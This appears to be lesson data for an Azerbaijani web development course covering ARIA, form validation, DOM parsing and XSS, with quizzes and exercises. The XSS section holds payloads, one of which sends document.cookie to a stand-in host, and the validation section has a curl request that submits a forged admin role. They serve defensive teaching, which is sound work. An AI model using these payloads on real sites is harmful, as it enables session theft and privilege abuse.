          { t: "tip", text: "Ən sadə test: siçanı kənara qoy, saytı yalnız Tab, Shift+Tab, Enter və Space ilə işlət. Hər şeyə çata bilirsənsə, işin yarısı hazırdır." },
        ],
      },
      {
        level: "orta",
        title: "ARIA: HTML çatmayanda",
        blocks: [
          { t: "p", text: "ARIA (Accessible Rich Internet Applications) — elementə rol, ad və vəziyyət əlavə edən atributlardır. Görünüşü və davranışı DƏYİŞMİR, yalnız ekran oxuyucuya məlumat verir." },
          { t: "code", lang: "html", code: `<!-- Yalnız ikon olan düymə: adı aria-label verir -->
<button type="button" aria-label="Menyunu bağla">✕</button>

<!-- Açılıb-bağlanan menyu: vəziyyəti bildir -->
<button type="button" aria-expanded="false" aria-controls="menyu">Menyu</button>
<ul id="menyu" hidden>...</ul>

<!-- Dinamik mesaj: dəyişəndə oxuyucu özü səsləndirir -->
<p role="status" aria-live="polite">Səbətə əlavə olundu</p>

<!-- Bəzək ikonu oxunmasın -->
<span aria-hidden="true">★</span> 4.8 reytinq` },
          { t: "terms", items: [
            ["aria-label", "görünən mətni olmayan elementə ad verir."],
            ["aria-expanded", "açıqdır (true) ya bağlı (false). JS ilə özün dəyişməlisən."],
            ["aria-live=\"polite\"", "məzmun dəyişəndə oxuyucu cari cümləni bitirib bunu oxuyur. Təcili xəta üçün role=\"alert\"."],
            ["aria-hidden=\"true\"", "elementi əlçatanlıq ağacından çıxarır (ekranda qalır)."],
          ]},
          { t: "mistake", lang: "html", wrong: `<div role="button" onclick="sil()">Sil</div>`, right: `<button type="button" onclick="sil()">Sil</button>`, why: "role yalnız ad verir. Fokus (tabindex), Enter/Space, disabled davranışını özün yazmalı olacaqsan. ARIA-nın birinci qaydası: native element varsa, onu işlət." },
          { t: "mistake", lang: "html", wrong: `<a href="/kurs/5">Buraya klik et</a>\n<img src="logo.png">`, right: `<a href="/kurs/5">Python kursuna bax</a>\n<img src="logo.png" alt="Kod Akademiyası">`, why: "Oxuyucu istifadəçisi linklərin siyahısını ayrıca dinləyir: «buraya klik et» heç nə demir. alt-sız şəkildə isə fayl adı oxunur." },
          { t: "list", items: [
            "Kontrast: mətnlə fon arasında ən azı 4.5:1 (iri mətn üçün 3:1). DevTools rəng seçicisində göstərilir.",
            "Məlumatı təkcə rənglə vermə: xəta üçün qırmızı + ikon + mətn.",
            "outline: none yazıb fokus halqasını silmə. Bəyənmirsənsə :focus-visible ilə öz stilini ver.",
            "Toxunma hədəfi ən azı 44×44 px olsun.",
          ]},
        ],
      },
      {
        level: "senior",
        title: "Əlçatanlıq ağacı, fokus idarəsi, WCAG",
        blocks: [
          { t: "p", text: "Brauzer DOM-dan əlçatanlıq ağacı (accessibility tree) qurur və onu əməliyyat sisteminin API-si ilə ekran oxuyucuya ötürür. Hər düyündə 4 şey var: rol (button), ad (accessible name), vəziyyət (expanded, checked) və dəyər. Ad bu sıra ilə hesablanır: aria-labelledby → aria-label → label/məzmun mətni → title. DevTools → Elements → Accessibility panelində görə bilərsən." },
          { t: "code", lang: "html", code: `<!-- Native dialog: fokus tələsi, Esc, arxa fonun bloklanması hazırdır -->
<dialog id="tesdiq" aria-labelledby="d-bas">
  <h2 id="d-bas">Silmək istəyirsən?</h2>
  <form method="dialog">
    <button value="yox">Xeyr</button>
    <button value="he">Bəli, sil</button>
  </form>
</dialog>

<button type="button" onclick="tesdiq.showModal()">Sil</button>

<!-- Ekranda gizli, oxuyucuya açıq mətn -->
<style>
  .sr-only {
    position: absolute; width: 1px; height: 1px;
    overflow: hidden; clip-path: inset(50%); white-space: nowrap;
  }
</style>`, caption: "showModal() fokus tələsini (focus trap) və Esc-i özü idarə edir" },
          { t: "list", items: [
            "WCAG 2.2 — beynəlxalq standart, 4 prinsip (POUR): Qavranılan, İdarəolunan, Anlaşılan, Dayanıqlı. Hədəf adətən AA səviyyəsidir; Avropada (EAA) və dövlət saytlarında qanuni tələbdir.",
            "tabindex=\"0\" — elementi Tab sırasına salır; \"-1\" — yalnız JS ilə (focus()) fokuslanır; müsbət ədəd (1, 2...) sıranı pozur, işlətmə.",
            "SPA-da səhifə dəyişəndə fokus köhnə yerdə qalır. Marşrut dəyişəndə fokusu h1-ə və ya main-ə köçür, başlığı (title) yenilə.",
            "Modal bağlananda fokusu onu açan düyməyə qaytar.",
            "display:none və hidden həm ekrandan, həm ağacdan çıxarır; aria-hidden yalnız ağacdan; .sr-only yalnız ekrandan.",
            "prefers-reduced-motion: animasiya bəzi insanlarda başgicəllənmə yaradır — hörmət et.",
            "Avtomat alətlər (axe, Lighthouse) problemlərin ~30–40%-ni tapır. Qalanı əl ilə: klaviatura və real oxuyucu (NVDA, VoiceOver) testi.",
            "TƏHLÜKƏSİZLİK: .sr-only, aria-hidden və ya display:none ilə «gizlədilən» məlumat HTML-də qalır — hər kəs mənbə kodunda görür. Məxfi məlumatı (başqasının e-poçtu, token) ümumiyyətlə göndərmə.",
            "TƏHLÜKƏSİZLİK: aria-label, alt, title-a istifadəçi mətni qoyanda da escape et — atribut içindən dırnaqla çıxıb onerror=... əlavə etmək XSS-dir. CAPTCHA-nın səsli alternativi olmalıdır, yoxsa görməyən istifadəçini bloklayırsan.",
          ]},
          { t: "qa", items: [
            ["ARIA-nın birinci qaydası?", "Lazımi semantika və davranışı verən native HTML elementi varsa, ARIA əvəzinə onu işlət. Pis ARIA heç ARIA olmamaqdan pisdir."],
            ["aria-label ilə aria-labelledby fərqi?", "aria-label adı sətir kimi verir (görünmür). aria-labelledby səhifədəki mövcud elementin id-sinə istinad edir — görünən mətn təkrarlanmır və tərcümə ilə birlikdə dəyişir."],
            ["Modal pəncərəni əlçatan etmək üçün nə lazımdır?", "role=dialog + ad, açılanda fokusu içəri salmaq, Tab-ı içəridə saxlamaq, Esc ilə bağlamaq, arxa fonu inert etmək, bağlananda fokusu qaytarmaq. <dialog>.showModal() bunların çoxunu hazır verir."],
          ]},
        ],
      },
      {
        level: "baslangic",
        title: "Özünü yoxla",
        blocks: [
          { t: "quiz", q: "Yalnız bəzək üçün olan şəklə nə yazılır?", options: ["alt atributu yazılmır", "alt=\"\"", "alt=\"şəkil\""], answer: 1, why: "Boş alt oxuyucuya «bunu ötür» deyir. alt olmasa fayl adı oxunar." },
          { t: "quiz", q: "role=\"button\" div-ə nə verir?", options: ["Enter ilə işləməyi", "Tab ilə fokusu", "Yalnız oxuyucu üçün «düymə» adını"], answer: 2, why: "ARIA davranış əlavə etmir — yalnız məlumat verir." },
          { t: "quiz", q: "Fokus halqasını (outline) silmək olar?", options: ["Hə, dizaynı korlayır", "Yalnız :focus-visible ilə əvəzini versən", "Mobil-də olar"], answer: 1, why: "Klaviatura istifadəçisi harada olduğunu görməlidir." },
        ],
      },
    ],
    exercise: {
      task: "Aşağıdakı əlçatan olmayan kodu düzəlt: şəklə alt ver, div-düyməni button et, ikon düyməsinə ad ver, input-a label bağla, «buraya klik» linkinə mənalı mətn yaz.",
      starter: `<img src="kurs.jpg">\n\n<div class="btn" onclick="alert('Alındı')">Kursu al</div>\n\n<button>✕</button>\n\n<input type="email" placeholder="E-poçt">\n\n<a href="/kurslar">buraya klik et</a>\n`,
      expect: "img-də mənalı alt; div əvəzinə button type=button; ✕ düyməsində aria-label; input-un id-si və ona for ilə bağlı label (və ya label içində input) var; link mətni təyinatı izah edir. role=button-lu div qəbul edilmir.",
    },
  },
  {
    slug: "validasiya",
    title: "Forma validasiyası",
    intro: "Validasiya — istifadəçinin daxil etdiyi məlumatın düzgünlüyünü yoxlamaqdır. HTML bunu JS-siz, atributlarla edə bilir: required, type, min, pattern.",
    sections: [
      {
        level: "baslangic",
        title: "Atributlarla yoxlama",
        blocks: [
          { t: "analogy", text: "Hava limanında qapıdakı nəzarətçi biletinə baxır: adın var? tarix düzdür? Problem varsa, səni elə qapıda saxlayır — təyyarəyə qədər getmirsən. Brauzer validasiyası da belədir: səhv forma serverə getmir." },
          { t: "code", lang: "html", code: `<form action="/qeydiyyat" method="post">
  <label for="ad">Ad</label>
  <input id="ad" name="ad" required minlength="2" maxlength="40">

  <label for="email">E-poçt</label>
  <input id="email" name="email" type="email" required>

  <label for="yas">Yaş</label>
  <input id="yas" name="yas" type="number" min="16" max="99">

  <button type="submit">Göndər</button>
</form>` },
          { t: "terms", items: [
            ["required", "sahə boş qala bilməz."],
            ["type=\"email\"", "mətn e-poçt formatında olmalıdır (içində @ və s.). url, number, date də var."],
            ["minlength / maxlength", "simvol sayının aşağı və yuxarı həddi."],
            ["min / max", "ədəd və ya tarix üçün hədlər."],
          ]},
          { t: "tip", text: "Düzgün type mobil-də həm də uyğun klaviatura açır: email-də @ düyməsi, tel-də rəqəmlər." },
        ],
      },
      {
        level: "orta",
        title: "pattern, xəta mesajı və stil",
        blocks: [
          { t: "code", lang: "html", code: `<label for="tel">Telefon</label>
<input id="tel" name="tel" type="tel"
       pattern="\\+994[0-9]{9}"
       title="Format: +994501234567"
       autocomplete="tel" required>

<style>
  input:user-invalid { border-color: #f43f5e; }
  input:user-valid   { border-color: #22c55e; }
</style>`, caption: "pattern — müntəzəm ifadə (regex); bütün dəyər ona uyğun gəlməlidir" },
          { t: "terms", items: [
            ["pattern", "müntəzəm ifadə (regular expression). Avtomatik ^ və $ ilə əhatələnir — tam uyğunluq tələb olunur."],
            ["title", "pattern uyğun gəlməyəndə brauzer mesajına əlavə olunan izah."],
            [":user-invalid", "sahə səhvdirsə VƏ istifadəçi ona toxunubsa. :invalid isə səhifə açılan kimi qırmızı edir — pis təcrübə."],
            ["autocomplete", "brauzerə sahənin nə olduğunu deyir: email, tel, name, new-password, one-time-code."],
          ]},
          { t: "code", lang: "html", code: `<form id="f">
  <input id="s1" type="password" minlength="8" required>
  <input id="s2" type="password" required>
  <button>Qeydiyyat</button>
</form>
<script>
  const s1 = document.getElementById("s1");
  const s2 = document.getElementById("s2");
  s2.addEventListener("input", () => {
    // boş sətir = «xəta yoxdur»
    s2.setCustomValidity(s1.value === s2.value ? "" : "Şifrələr eyni deyil");
  });
</script>`, caption: "Constraint Validation API: öz qaydanı brauzer validasiyasına qoşmaq" },
          { t: "mistake", lang: "html", wrong: `<input type="text" name="email">\n<!-- yoxlama yalnız JS-də, 30 sətir regex -->`, right: `<input type="email" name="email" required autocomplete="email">`, why: "Brauzer bunu hazır edir: format yoxlaması, tərcümə olunmuş mesaj, mobil klaviatura, avtomatik doldurma. JS yalnız HTML-in bacarmadığı qaydalar üçün lazımdır." },
          { t: "mistake", lang: "html", wrong: `<input placeholder="E-poçt" required>`, right: `<label for="e">E-poçt</label>\n<input id="e" type="email" required aria-describedby="e-xeta">\n<p id="e-xeta" role="alert"></p>`, why: "placeholder label deyil: yazmağa başlayanda itir, kontrastı zəifdir. Xəta mətnini aria-describedby ilə sahəyə bağla ki, ekran oxuyucu da eşitsin." },
        ],
      },
      {
        level: "senior",
        title: "Brauzer yoxlaması rahatlıqdır, təhlükəsizlik deyil",
        blocks: [
          { t: "p", text: "Göndərmə (submit) zamanı brauzer hər sahənin ValidityState obyektini yoxlayır: valueMissing, typeMismatch, patternMismatch, tooShort, rangeUnderflow, customError və s. Biri true olsa, submit hadisəsi BAŞ VERMİR, ilk səhv sahə fokuslanır və mesaj çıxır. form.checkValidity() yoxlayır, reportValidity() həm də mesajı göstərir. novalidate atributu bunu söndürür — öz dizaynlı xətalarını göstərmək istəyəndə işlədilir." },
          { t: "warn", text: "TƏHLÜKƏSİZLİK: klient validasiyasını keçmək 5 saniyəlik işdir — DevTools-da required-i silmək, ya da curl/Postman ilə sorğunu birbaşa göndərmək. Server HƏR ŞEYİ yenidən yoxlamalıdır: tip, uzunluq, hədlər, icazə. HTML validasiyası UX-dir, qoruma deyil." },
          { t: "list", items: [
            "TƏHLÜKƏSİZLİK: maxlength, hidden input, disabled, select variantları — hamısı klientdə dəyişdirilə bilər. Qiyməti, rolu (role=admin), user id-ni gizli input-da göndərib ona inanma.",
            "TƏHLÜKƏSİZLİK — ReDoS: (a+)+$ kimi iç-içə təkrarlı regex uzun girişdə eksponensial vaxt aparır. Eyni regex-i serverdə işlədirsənsə, bir sorğu serveri dondura bilər. Sadə regex yaz, uzunluğu əvvəl yoxla.",
            "TƏHLÜKƏSİZLİK: validasiya ≠ təmizləmə. Düzgün formatlı giriş də zərərli ola bilər. SQL üçün parametrli sorğu, HTML çıxışı üçün escape — validasiyadan asılı olmayaraq.",
            "Xəta mesajında artıq məlumat vermə: «bu e-poçt artıq qeydiyyatdadır» hücumçuya istifadəçi siyahısını yoxlamağa imkan verir (user enumeration).",
            "Şifrə sahəsi: autocomplete=\"new-password\" / \"current-password\" — parol menecerləri düzgün işləsin. Yapışdırmanı (paste) qadağan etmə — bu, təhlükəsizliyi azaldır.",
            "Faylda accept=\"image/*\" yalnız seçim pəncərəsini süzür. Serverdə faylın həqiqi tipini və ölçüsünü yoxla.",
            "Validasiya qaydalarını bir yerdə saxla (məs. Zod sxemi) və həm klientdə, həm serverdə işlət — ikisi fərqlənməsin.",
            "Xətanı blur-da (sahədən çıxanda) göstər, hər hərfdə yox; düzələn kimi dərhal sil.",
          ]},
          { t: "qa", items: [
            ["Niyə həm klient, həm server validasiyası lazımdır?", "Klient — sürətli əks-əlaqə və az sorğu (UX). Server — yeganə etibarlı yoxlama, çünki klient tam istifadəçinin nəzarətindədir."],
            ["setCustomValidity necə işləyir?", "Boş olmayan sətir verəndə sahə invalid sayılır (customError) və həmin mətn mesaj kimi göstərilir. Boş sətir xətanı silir. Hər input hadisəsində yenidən hesablanmalıdır."],
            [":invalid ilə :user-invalid fərqi?", ":invalid səhifə yüklənən kimi boş required sahələrə də tətbiq olunur. :user-invalid yalnız istifadəçi sahə ilə işlədikdən və ya submit cəhdindən sonra."],
          ]},
          { t: "h", text: "Client validasiyası təhlükəsizlik deyil" },
          { t: "p", text: "required, pattern, min/max, type=\"email\" kimi atributlar istifadəçiyə sürətli geri bildirim verir — UX üçündür. Hücumçu brauzeri tamamilə yan keçib birbaşa curl, Postman və ya skriptlə serverə istənilən məlumatı göndərə bilər. Ona görə hər qayda serverdə də təkrar yoxlanmalıdır." },
          { t: "code", lang: "bash", code: `# HTML formasındakı required, maxlength və pattern bu sorğuda iştirak etmir:
curl -X POST https://sayt.az/qeydiyyat \\
  -d "email=bu-email-deyil" \\
  -d "yas=-5" \\
  -d "rol=admin"` },
          { t: "list", items: [
            "Ağ siyahı (allowlist) yanaşması: icazə verilən formatı təsvir et, qalan hər şeyi rədd et. Qara siyahı (blocklist) həmişə yan keçilir.",
            "Server yoxlaması: tip, uzunluq, aralıq, format, icazə verilən dəyərlər (enum) və biznes qaydaları (yaş ≥ 18, unikal email).",
            "Validasiya ≠ sanitizasiya ≠ escape: validasiya girişi qəbul/rədd edir; escape çıxış kontekstinə görə (HTML, SQL, URL) edilir. Hər biri ayrı problemi həll edir.",
            "Xəta mesajları: «Email və ya parol yanlışdır» — hansının səhv olduğunu bildirmə (istifadəçi adlarının sadalanmasının qarşısı).",
            "Sorğu sürətini məhdudlaşdır (rate limiting) və CAPTCHA/lockout ilə brute-force-un qarşısını al.",
          ]},
          { t: "mistake", lang: "js", wrong: `// Yalnız brauzerdə
if (yas < 18) { alert("Yaş kifayət deyil"); return; }
fetch("/qeydiyyat", { method: "POST", body: JSON.stringify({ yas, rol }) });`, right: `// Server (Node nümunəsi)
if (!Number.isInteger(body.yas) || body.yas < 18) return res.status(400).end();
const icazeli = new Set(["istifadeci", "muellim"]);
if (!icazeli.has(body.rol)) return res.status(400).end();`, why: "Brauzer kodu hücumçunun nəzarətindədir. Etibarlı qərar yalnız serverdə verilir; rol kimi sahələri istifadəçidən qəbul etmək əvəzinə serverdə təyin et." },
          { t: "qa", items: [
            ["Niyə həm client, həm server validasiyası lazımdır?", "Client — sürətli UX; server — həqiqi təhlükəsizlik. Client tərəfi bypass edilə bilər, ona görə server tərəfi məcburidir."],
            ["pattern atributu ilə təhlükəsizlik təmin olunurmu?", "Xeyr. O, yalnız brauzerdə formanın göndərilməsini bloklayır; DevTools və ya birbaşa HTTP sorğusu onu keçir."],
          ]},
        ],
      },
      {
        level: "baslangic",
        title: "Özünü yoxla",
        blocks: [
          { t: "quiz", q: "Sahənin boş qalmamasını hansı atribut tələb edir?", options: ["pattern", "required", "minlength=\"0\""], answer: 1, why: "required boş dəyəri qəbul etmir." },
          { t: "quiz", q: "HTML validasiyası olan formada server yoxlaması lazımdır?", options: ["Yox, brauzer yoxlayır", "Yalnız şifrə üçün", "Hə, həmişə"], answer: 2, why: "Klient yoxlamasını istənilən şəxs söndürə və ya ötürə bilər." },
        ],
      },
    ],
    exercise: {
      task: "Qeydiyyat forması: ad (məcburi, 2–40 simvol), e-poçt (məcburi), telefon (+994 və 9 rəqəm, pattern + title), yaş (16–99), şifrə (ən azı 8 simvol). Hər sahənin label-i olsun, səhv sahə :user-invalid ilə qırmızı haşiyə alsın.",
      starter: `<form>\n\n  <button type="submit">Qeydiyyat</button>\n</form>\n\n<style>\n\n</style>\n`,
      expect: "Hər input-un for/id ilə bağlı label-i var; ad required+minlength+maxlength; type=email required; tel-də pattern (+994 və 9 rəqəm) və title; type=number min=16 max=99; type=password minlength=8 required; :user-invalid (və ya :invalid) stili yazılıb. Uyğun autocomplete dəyərləri üstünlükdür.",
    },
  },
  {
    slug: "dom",
    title: "DOM ağacı necə qurulur",
    intro: "DOM (Document Object Model) — brauzerin HTML mətnindən yaddaşda qurduğu obyekt ağacıdır. CSS və JavaScript HTML faylı ilə yox, məhz bu ağacla işləyir.",
    sections: [
      {
        level: "baslangic",
        title: "Mətndən ağaca",
        blocks: [
          { t: "analogy", text: "Nəsil ağacını düşün: baba → ata → sən. Hər kəsin valideyni, uşaqları, qardaşları var. DOM da belə ağacdır: html — baba, body — onun uşağı, h1 və p — body-nin uşaqları, bir-birinin qardaşı." },
          { t: "code", lang: "html", code: `<html>
  <head>
    <title>Salam</title>
  </head>
  <body>
    <h1>Başlıq</h1>
    <p>Mətn <b>qalın</b></p>
  </body>
</html>` },
          { t: "code", lang: "text", code: `document
└── html
    ├── head
    │   └── title
    │       └── "Salam"
    └── body
        ├── h1
        │   └── "Başlıq"
        └── p
            ├── "Mətn "
            └── b
                └── "qalın"`, caption: "Eyni səhifənin DOM ağacı" },
          { t: "terms", items: [
            ["düyün (node)", "ağacın hər bir nöqtəsi: element, mətn, şərh."],
            ["element", "teqdən yaranan düyün: h1, p, body."],
            ["mətn düyünü (text node)", "teqlərin arasındakı mətn. O da ayrıca düyündür."],
            ["valideyn / uşaq / qardaş", "parent / child / sibling — düyünlər arasındakı qohumluq."],
            ["document", "ağacın kökü. JS-də hər şeyə buradan çatırsan."],
          ]},
          { t: "tip", text: "F12 → Elements paneli HTML faylını yox, canlı DOM-u göstərir. «Səhifənin mənbəyinə bax» (Ctrl+U) isə serverdən gələn ilkin mətni." },
        ],
      },
      {
        level: "orta",
        title: "HTML ≠ DOM",
        blocks: [
          { t: "p", text: "DOM HTML-in surəti deyil. Üç səbəbdən fərqlənə bilər: brauzer səhvləri özü düzəldir, JavaScript ağacı dəyişir, bəzi düyünləri brauzer özü əlavə edir." },
          { t: "code", lang: "html", code: `<!-- Sən yazdın: -->
<table>
  <tr><td>Əli</td></tr>
</table>
<p>Birinci
<p>İkinci

<!-- DOM-da alındı: -->
<table>
  <tbody>
    <tr><td>Əli</td></tr>
  </tbody>
</table>
<p>Birinci</p>
<p>İkinci</p>`, caption: "Brauzer tbody əlavə etdi və bağlanmamış p-ləri bağladı" },
          { t: "code", lang: "html", code: `<ul id="siyahi">
  <li>HTML</li>
</ul>

<script>
  const siyahi = document.getElementById("siyahi");

  const li = document.createElement("li");   // yeni düyün
  li.textContent = "CSS";                    // təhlükəsiz mətn
  siyahi.append(li);                         // ağaca əlavə

  console.log(siyahi.children.length);       // 2
  console.log(li.parentElement.id);          // "siyahi"
</script>`, caption: "JS DOM-u dəyişir — HTML faylı isə olduğu kimi qalır" },
          { t: "mistake", lang: "html", wrong: `<head>\n  <script>\n    document.getElementById("btn").onclick = salam; // null!\n  </script>\n</head>\n<body>\n  <button id="btn">Salam</button>\n</body>`, right: `<head>\n  <script src="app.js" defer></script>\n</head>\n<body>\n  <button id="btn">Salam</button>\n</body>`, why: "Brauzer HTML-i yuxarıdan aşağı oxuyur. head-dəki skript işləyəndə button hələ DOM-da yoxdur. defer skripti ağac tam qurulandan sonra icra edir." },
          { t: "mistake", lang: "html", wrong: `<div id="kart"></div>\n<div id="kart"></div>`, right: `<div class="kart"></div>\n<div class="kart"></div>`, why: "id sənəddə unikal olmalıdır. Təkrar olsa getElementById yalnız birincini qaytarır, label for və aria-labelledby səhv elementə bağlanır." },
        ],
      },
      {
        level: "senior",
        title: "Parser daxildən: tokenlər, bloklama, XSS",
        blocks: [
          { t: "p", text: "Yol belədir: baytlar → simvollar (charset) → tokenlər (açılış teqi, mətn, bağlanış teqi) → düyünlər → DOM. Parser axınla (streaming) işləyir: HTML hissə-hissə gəldikcə ağac qurulur, ona görə səhifə tam yüklənməmiş görünməyə başlayır. Xətalı HTML-in necə düzəldiləcəyi spesifikasiyada dəqiq yazılıb — bütün brauzerlər eyni ağacı qurur." },
          { t: "list", items: [
            "Adi <script> parseri DAYANDIRIR: yüklənir, icra olunur, sonra parser davam edir (çünki skript document.write ilə HTML-i dəyişə bilər). defer/async/type=module bloklamır.",
            "Skript icradan əvvəl özündən yuxarıdakı CSS-in yüklənməsini də gözləyir — yəni CSS dolayı yolla parseri bloklaya bilər.",
            "Preload scanner: parser dayananda ikinci, yüngül skaner HTML-i qabağa oxuyub şəkil/skript/CSS-ləri əvvəlcədən yükləyir. JS ilə əlavə olunan resursları isə görmür.",
            "DOMContentLoaded — DOM hazırdır (defer skriptlər icra olunub); load — şəkillər, CSS də daxil hər şey yüklənib.",
            "NodeList/HTMLCollection canlı (live) ola bilər: getElementsByClassName canlıdır, querySelectorAll statik surət qaytarır.",
            "Böyük DOM (1500+ düyün, dərinlik 32+) stil hesablamasını, layout-u və yaddaşı ağırlaşdırır. Uzun siyahılar üçün virtuallaşdırma.",
            "Çoxlu əlavəni DocumentFragment-də yığıb bir dəfəyə qoş — layout bir dəfə hesablansın. Shadow DOM isə komponent üçün ayrı, kapsullanmış alt-ağacdır.",
          ]},
          { t: "code", lang: "html", code: `<script>
  const ad = new URLSearchParams(location.search).get("ad");

  // ❌ XSS: ?ad=<img src=x onerror=alert(document.cookie)>
  // salam.innerHTML = "Salam, " + ad;

  // ✅ Mətn kimi yazılır, HTML kimi parse olunmur
  salam.textContent = "Salam, " + ad;
</script>`, caption: "TƏHLÜKƏSİZLİK: DOM əsaslı XSS" },
          { t: "list", items: [
            "TƏHLÜKƏSİZLİK: innerHTML, outerHTML, insertAdjacentHTML, document.write — sətri HTML kimi parse edir. İstifadəçidən, URL-dən və ya API-dən gələn mətni bunlara vermə. textContent / createElement işlət; HTML mütləq lazımdırsa DOMPurify ilə təmizlə.",
            "TƏHLÜKƏSİZLİK — DOM clobbering: id və name-li elementlər window üzərində qlobal dəyişən olur. Hücumçu <a id=\"config\"> yeridə bilsə, window.config sənin obyektin yox, o element olar. Qlobal adlara güvənmə, dəyişənləri açıq elan et.",
            "TƏHLÜKƏSİZLİK: href-ə istifadəçi URL-i qoyanda sxemi yoxla — javascript:alert(1) də «link»dir. Yalnız http/https-ə icazə ver.",
            "Əlavə qat: CSP başlığı (inline skripti qadağan edir) və Trusted Types (innerHTML-ə adi sətir verməyi brauzer səviyyəsində bloklayır).",
          ]},
          { t: "qa", items: [
            ["DOM ilə HTML mənbəyinin fərqi?", "HTML — serverdən gələn mətn. DOM — ondan qurulmuş canlı obyekt ağacı; parser düzəlişləri və JS dəyişiklikləri səbəbindən mənbədən fərqlənə bilər."],
            ["Niyə skripti body-nin sonuna qoyurdular, indi niyə defer?", "Adi skript parseri bloklayır, sona qoyanda DOM artıq hazır olur. defer eyni nəticəni verir, amma fayl paralel yüklənir — daha sürətli."],
            ["innerHTML ilə textContent fərqi?", "innerHTML sətri HTML kimi parse edib düyünlər yaradır (XSS riski, yavaş). textContent hər şeyi bir mətn düyünü kimi yazır — təhlükəsiz və sürətli."],
            ["DOMContentLoaded və load fərqi?", "Birincisi DOM ağacı qurulanda, ikincisi bütün asılı resurslar (şəkil, CSS, iframe) yüklənəndə baş verir."],
          ]},
          { t: "h", text: "XSS: istifadəçi məlumatını HTML kimi yazma" },
          { t: "p", text: "Cross-Site Scripting (XSS) istifadəçi tərəfindən idarə olunan mətnin HTML/JS kimi şərh olunması nəticəsində baş verir. Hücumçu skriptini səhifəyə yeridir və o, istifadəçinin cookie-sinə, tokenlərinə və hərəkətlərinə çıxış alır. Üç növü var: Stored (bazada saxlanır), Reflected (URL-dən əks olunur), DOM-based (yalnız client JS-də baş verir)." },
          { t: "code", lang: "js", code: `const sherh = new URLSearchParams(location.search).get("s");

// TƏHLÜKƏLİ: sherh = <img src=x onerror="fetch('//zerer.az?c='+document.cookie)">
div.innerHTML = sherh;

// TƏHLÜKƏSİZ: mətn kimi yazılır, HTML parse olunmur
div.textContent = sherh;

// Atribut/element yaradarkən də API işlət
const a = document.createElement("a");
a.textContent = "Profil";
a.href = "/profil/" + encodeURIComponent(istifadeciAdi);` },
          { t: "list", items: [
            "Təhlükəli «sink»-lər: innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, setTimeout(string), on* atributları, javascript: URL-lər.",
            "Çıxışı kontekstə görə escape et: HTML mətnində < > & \" ', atributda dırnaq, URL-də encodeURIComponent, JS içində JSON.stringify. Eyni escape hər yerdə işləmir.",
            "HTML yazmaq həqiqətən lazımdırsa (zəngin mətn redaktoru) — yoxlanılmış sanitizer işlət (məs. DOMPurify); özün regex ilə yazma.",
            "Müasir şablon çərçivələri (React, Next.js, Vue) default olaraq mətni escape edir; təhlükə dangerouslySetInnerHTML / v-html kimi «çıxış qapılarında» yaranır.",
            "HttpOnly cookie JavaScript-in sessiya cookie-sinə çıxışını bağlayır; XSS-i aradan qaldırmır, amma oğurlanan məlumatın həcmini azaldır.",
            "Trusted Types (CSP: require-trusted-types-for 'script') təhlükəli sink-lərə yalnız yoxlanılmış dəyərlərin yazılmasını məcbur edir.",
          ]},
          { t: "mistake", lang: "js", wrong: `list.innerHTML += "<li>" + istifadeciMetni + "</li>";`, right: `const li = document.createElement("li");
li.textContent = istifadeciMetni;
list.append(li);`, why: "Konkatenasiya istifadəçi mətnini markup-a çevirir. DOM API və textContent ilə mətn həmişə məlumat kimi qalır, kod kimi icra olunmur." },
          { t: "warn", text: "Girişi «təmizləyib» bazaya yazmaq (məsələn < simvolunu silmək) etibarlı müdafiə deyil. Məlumatı olduğu kimi saxla, göstərdiyin yerdə kontekstə uyğun escape et." },
          { t: "qa", items: [
            ["innerHTML ilə textContent fərqi təhlükəsizlik baxımından nədir?", "innerHTML mətni HTML kimi parse edir və skript icrasına yol aça bilər; textContent isə mətni olduğu kimi, markup olmadan yazır."],
            ["Stored və Reflected XSS fərqi?", "Stored-da zərərli məzmun serverdə saxlanır və hər baxan istifadəçiyə çatır; Reflected-də URL və ya sorğu parametri cavabda əks olunur və hücumçu qurbanı həmin linkə kliklətməlidir."],
          ]},
        ],
      },
      {
        level: "baslangic",
        title: "Özünü yoxla",
        blocks: [
          { t: "quiz", q: "<p>Salam <b>dünya</b></p> — p-nin neçə uşaq düyünü var?", options: ["1", "2", "3"], answer: 1, why: "«Salam » mətn düyünü və b elementi. «dünya» b-nin uşağıdır." },
          { t: "quiz", q: "İstifadəçinin yazdığı adı səhifəyə təhlükəsiz necə yazmaq olar?", options: ["el.innerHTML = ad", "el.textContent = ad", "document.write(ad)"], answer: 1, why: "textContent mətni HTML kimi parse etmir — skript icra oluna bilməz." },
          { t: "quiz", q: "Elements paneli nəyi göstərir?", options: ["Serverdən gələn HTML faylını", "Canlı DOM ağacını", "CSS faylını"], answer: 1, why: "Panel JS dəyişiklikləri və parser düzəlişləri ilə birlikdə cari DOM-u göstərir." },
        ],
      },
    ],
    exercise: {
      task: "Siyahıya düymə ilə yeni bənd əlavə et: input-a yazılan mətn «Əlavə et» basılanda ul-a yeni li kimi düşsün. createElement + textContent işlət (innerHTML YOX). Boş mətn əlavə olunmasın, sonda bəndlərin sayını göstər.",
      starter: `<input id="metn" placeholder="Yeni bənd">\n<button id="elave" type="button">Əlavə et</button>\n<ul id="siyahi">\n  <li>HTML</li>\n</ul>\n<p id="say"></p>\n\n<script>\n\n</script>\n`,
      expect: "click hadisəsində createElement('li'), textContent ilə mətn, append/appendChild ilə ul-a əlavə; boş/boşluqdan ibarət mətn yoxlanır (trim); say children.length və ya querySelectorAll ilə göstərilir; istifadəçi mətni üçün innerHTML işlədilməyib.",
    },
  },
  {
    slug: "performans",
    title: "Render, yükləmə və performans",
    intro: "Sürətli sayt daha çox istifadəçi saxlayır və Google-da yuxarı çıxır. Sürətin böyük hissəsi HTML-də həll olunur: resurslar nə vaxt və hansı sıra ilə yüklənir.",
    sections: [
      {
        level: "baslangic",
        title: "Brauzer səhifəni necə yükləyir",
        blocks: [
          { t: "analogy", text: "Restoranda ofisiant əvvəl çörək və suyu gətirir, əsas yeməyi sonra. Hər şeyi birdən gözləsəydin, yarım saat ac oturardın. Yaxşı səhifə də belədir: əvvəl vacib olanı göstərir, qalanını sonra yükləyir." },
          { t: "code", lang: "html", code: `<head>
  <link rel="stylesheet" href="stil.css">
  <script src="app.js" defer></script>
</head>
<body>
  <img src="banner.jpg" alt="Kurs banneri" width="1200" height="600">

  <!-- Aşağıdakı şəkil: yalnız ona yaxınlaşanda yüklənsin -->
  <img src="muellim.jpg" alt="Müəllim" width="400" height="400" loading="lazy">
</body>` },
          { t: "terms", items: [
